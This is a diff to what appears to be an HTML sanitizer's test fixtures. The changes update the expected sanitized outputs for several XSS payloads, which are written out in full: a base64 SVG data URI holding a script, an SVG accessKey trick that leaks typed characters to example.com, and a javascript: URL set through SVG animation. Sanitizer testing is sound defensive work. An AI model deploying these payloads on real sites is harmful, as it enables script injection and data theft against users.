@@ -617,9 +617,9 @@ module.exports = [{
   }, {
       "payload": "<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<feImage>\n<set attributeName=\"xlink:href\" to=\"data:image/svg+xml;charset=utf-8;base64,\nPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D\"/>\n</feImage>\n</svg>//[\"'`-->]]>]</div>",
       "expected": [
-          "<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
-          "<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n\n\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
-          "<div id=\"95\"><svg xmlns=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\">\n\n</svg>//[\"'`--&gt;]]&gt;]</div>"
+          "<div id=\"95\"><svg xmlns:xlink=\"http://www.w3.org/1999/xlink\" xmlns=\"http://www.w3.org/2000/svg\">\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
+          "<div id=\"95\"><svg xmlns:xlink=\"http://www.w3.org/1999/xlink\" xmlns=\"http://www.w3.org/2000/svg\">\n\n\n\n</svg>//[\"'`--&gt;]]&gt;]</div>",
+          "<div id=\"95\"><svg xmlns:xlink=\"http://www.w3.org/1999/xlink\" xmlns=\"http://www.w3.org/2000/svg\" xmlns=\"http://www.w3.org/2000/svg\">\n\n</svg>//[\"'`--&gt;]]&gt;]</div>"
 
       ]
   }, {
@@ -800,10 +800,10 @@ module.exports = [{
   }, {
       "payload": "<div id=\"132\"><!doctype html>\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<!-- injection --><svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<set attributeName=\"xlink:href\" begin=\"accessKey(a)\" to=\"//example.com/?a\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(b)\" to=\"//example.com/?b\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(c)\" to=\"//example.com/?c\" />\n<set attributeName=\"xlink:href\" begin=\"accessKey(d)\" to=\"//example.com/?d\" />\n</image>\n</svg>//[\"'`-->]]>]</div>",
       "expected": [
-          "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input type=\"password\" name=\"secret\">\n</form>\n<svg height=\"50px\">\n<image>\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
-          "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input type=\"password\" name=\"secret\">\n\n<svg height=\"50px\">\n<image>\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</form></div>",
-          "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<svg height=\"50px\">\n<image>\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
-          "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"50px\">\n<image>\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>"
+          "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input type=\"password\" name=\"secret\">\n</form>\n<svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
+          "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input type=\"password\" name=\"secret\">\n\n<svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</form></div>",
+          "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<svg height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>",
+          "<div id=\"132\">\n<form>\n<label>type a,b,c,d - watch the network tab/traffic (JS is off, latest NoScript)</label>\n<br>\n<input name=\"secret\" type=\"password\">\n</form>\n<svg xmlns=\"http://www.w3.org/2000/svg\" height=\"50px\">\n<image xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n\n\n\n\n</image>\n</svg>//[\"'`--&gt;]]&gt;]</div>"
       ]
   }, {
       "payload": "<div id=\"133\"><!-- `<img/src=xx:xx onerror=alert(133)//--!>//[\"'`-->]]>]</div>",
@@ -834,9 +834,9 @@ module.exports = [{
       "title": "SVG",
       "payload": "<div id=\"137\"><svg>\n<a xmlns:xlink=\"http://www.w3.org/1999/xlink\" xlink:href=\"?\">\n<circle r=\"400\"></circle>\n<animate attributeName=\"xlink:href\" begin=\"0\" from=\"javascript:alert(137)\" to=\"&\" />\n</a>//[\"'`-->]]>]</div>",
       "expected": [
-          "<div id=\"137\"><svg>\n<a xlink:href=\"?\">\n<circle r=\"400\"></circle>\n\n</a>//[\"'`--&gt;]]&gt;]</svg></div>",
+          "<div id=\"137\"><svg>\n<a xlink:href=\"?\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<circle r=\"400\"></circle>\n\n</a>//[\"'`--&gt;]]&gt;]</svg></div>",
           "<div id=\"137\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a xmlns:NS1=\"\" NS1:xlink:href=\"?\">\n<circle r=\"400\" />\n\n</a>//[\"'`--&gt;]]&gt;]</svg></svg></div>",
-          "<div id=\"137\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a xlink:href=\"?\">\n<circle r=\"400\" />\n\n</a>//[\"'`--&gt;]]&gt;]</svg></svg></div>"
+          "<div id=\"137\"><svg xmlns=\"http://www.w3.org/2000/svg\">\n<a xlink:href=\"?\" xmlns:xlink=\"http://www.w3.org/1999/xlink\">\n<circle r=\"400\" />\n\n</a>//[\"'`--&gt;]]&gt;]</svg></svg></div>"
       ]
   }, {
       "title": "Removing name attr from img with id can crash Safari",
